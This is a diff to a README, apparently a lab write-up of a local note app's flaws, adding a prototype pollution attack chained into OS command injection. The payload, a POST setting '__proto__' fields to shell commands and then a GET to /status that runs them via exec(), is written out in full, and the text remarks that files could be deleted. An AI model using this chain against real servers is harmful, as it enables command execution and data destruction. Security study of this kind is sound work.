@@ -29,10 +29,8 @@ To make the following requests, I build HTTP Requests using Powershell's Invoke-
    This example specifically hits this README, but you can use this to access further files on the user's system.
 
 2. Prototype Pollution Exploit:
-
  ```
  POST: http://localhost/edit_note
- 
  Body, JSON Format:
  {
 		"id": "__proto__",
@@ -41,4 +39,18 @@ To make the following requests, I build HTTP Requests using Powershell's Invoke-
 }
  ```
 
-3. 
+3. OS Command Injection
+```
+POST: http://localhost/edit_note
+Body, JSON Format:
+{
+		"id": "__proto__",
+		"author": "ps aux | grep node > example.txt",
+		"raw": "cat example.txt"
+}
+GET: http://localhost/status
+```
+What the above does pollutes the base object with these extra commands. When running status, the extra commands are put in the list and executed by exec(), which enact these benign commands and makes a file.
+You can easily delete files you are not supposed to access.
+
+4. Patching the Prototype Pollution:
